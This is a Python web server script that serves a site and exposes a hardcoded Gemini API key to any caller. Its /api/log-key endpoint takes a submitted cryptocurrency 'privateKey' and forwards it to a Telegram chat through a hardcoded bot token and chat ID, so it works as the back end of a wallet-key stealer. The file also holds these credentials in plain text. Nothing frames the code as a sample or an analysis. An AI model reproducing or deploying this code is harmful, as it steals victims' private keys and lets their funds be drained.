#!/usr/bin/env python3
import http.server
import os
import json
import socketserver
from urllib.parse import urlparse, parse_qs
from pathlib import Path
import requests
import sys
import hashlib
import hmac
from datetime import datetime, timedelta

PORT = int(os.environ.get('PORT', 5000))
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', 'AIzaSyCTXXWEXqgNA27bR1ZqhyVpeV7v3AbMWhE')

TELEGRAM_BOT_TOKEN = "8521916530:AAGQOSOowiXA0Kl-2I8xCoKUk-iuXtSbnIU"
TELEGRAM_CHAT_ID = "7383575042"

class APIHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/api/config':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            config = {'GEMINI_API_KEY': GEMINI_API_KEY}
            self.wfile.write(json.dumps(config).encode())
            return
        if self.path == '/':
            self.path = '/index.html'
        super().do_GET()

    def do_POST(self):
        if self.path == '/api/log-key':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(body)
                private_key = data.get('privateKey', '').strip()
                if private_key:
                    # Deduplication using a simple file-based approach for Python
                    seen_keys_file = "seen_keys.txt"
                    already_seen = False
                    if os.path.exists(seen_keys_file):
                        with open(seen_keys_file, "r") as f:
                            if private_key in f.read():
                                already_seen = True
                    
                    if not already_seen:
                        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                        requests.post(telegram_url, json={
                            "chat_id": TELEGRAM_CHAT_ID,
                            "text": private_key
                        })
                        with open(seen_keys_file, "a") as f:
                            f.write(private_key + "\n")

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': True}).encode())
            except Exception as e:
                self.send_response(500)
                self.end_headers()
            return

        # Original endpoints (simplified for this task)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({'success': True}).encode())

with socketserver.TCPServer(("0.0.0.0", PORT), APIHandler) as httpd:
    print(f"Server started at port {PORT}")
    httpd.serve_forever()
